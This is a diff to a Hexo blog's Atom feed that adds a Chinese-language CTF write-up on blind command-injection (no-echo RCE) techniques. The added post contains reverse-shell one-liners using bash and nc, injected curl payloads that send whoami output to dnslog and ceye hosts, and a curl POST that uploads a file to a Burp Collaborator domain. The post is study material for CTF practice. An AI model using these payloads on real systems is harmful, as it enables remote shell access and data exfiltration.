@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-03-12T09:43:56.843Z</updated>
+  <updated>2023-03-12T09:49:27.773Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>看看无回显RCE</title>
+    <link href="http://example.com/2023/03/11/%E7%9C%8B%E7%9C%8B%E6%97%A0%E5%9B%9E%E6%98%BERCE/"/>
+    <id>http://example.com/2023/03/11/%E7%9C%8B%E7%9C%8B%E6%97%A0%E5%9B%9E%E6%98%BERCE/</id>
+    <published>2023-03-11T08:46:16.000Z</published>
+    <updated>2023-03-12T09:49:27.773Z</updated>
+    
+    <content type="html"><![CDATA[<p>学到了一点点新东西：</p><span id="more"></span><h1><span id="1什么是无回显rce"> 1.什么是无回显RCE</span></h1><p>简单说来应该就是和sql注入里的盲注一个概念，你看不到回显的结果是什么</p><p>就比如eval函数，他就是一个有回显的函数</p><p>但是exec()就是一个无回显的函数，你看不到结果是什么</p><h1><span id="2-how-2-solve-it"> 2. how 2 solve it?</span></h1><p>对于无回显的rce一般有三种解决方式：</p><ul><li>反弹shell</li><li>dnslog外带数据</li><li>时间盲注</li></ul><h2><span id="反弹shell"> 反弹shell</span></h2><p>使用<code>bash</code>或<code>nc</code>反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">nc -e /bin/sh ip port</span><br><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure><h2><span id="dnslog外带数据"> dnslog外带数据</span></h2><p>使用：</p><p><a href="http://ceye.io/">ceye</a></p><p>使用<code>;</code>作为命令的分隔符，然后发起<code>curl</code>请求</p><p>收到外带数据回显结果</p><p>不过这个b玩意太容易504 Gateway Time-out了…</p><p>等能访问的时候再补充图片吧</p><p>使用方法：</p><p>注册了一个账号以后就会有个属于自己的dnslog域名</p><p>然后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">1</span>;curl http:<span class="comment">//ip.port.b182oj.ceye.io/`whoami`</span></span><br></pre></td></tr></table></figure><p>如果使用<code>dnslog.cn</code></p><p><a href="dnslog.cn">dnslog</a></p><p>要这么写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=1;curl http://`whoami`.7sye14.dnslog.cn/</span><br></pre></td></tr></table></figure><p>可惜由于dir/ls会被空格截断</p><p>可以加上|sed -n '1p’来查看</p><p>…</p><h2><span id="extra"> extra:</span></h2><p>还可以使用burp的<code>Burp Collaborator Client</code></p><p>点击<code>Burp</code>就有<code>Burp Collaborator Client</code>了</p><p>点击<code>copy to clipboard</code></p><p>会生成一段：<code>ucamo87yesi3j87kf879es5cn3tuhj.burpcollaborator.net</code></p><p>然后payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;curl -X POST -F xx=@文件名 ucamo87yesi3j87kf879es5cn3tuhj.burpcollaborator.net</span><br></pre></td></tr></table></figure><p>tee：从标准输入读取，再写入标准输出和文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=ls / | tee 1.txt#</span><br><span class="line">访问1.txt即可</span><br></pre></td></tr></table></figure><h2><span id="时间盲注"> 时间盲注：</span></h2><p>使用sleep</p><p>不过我在nssctf上没成功（（（</p><p>所以这里就不多展开</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;学到了一点点新东西：&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="CTF Web" scheme="http://example.com/categories/CTF-Web/"/>
+    
+    
+    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
+    
+  </entry>
   
   <entry>
     <title>一道题学习两个知识点</title>
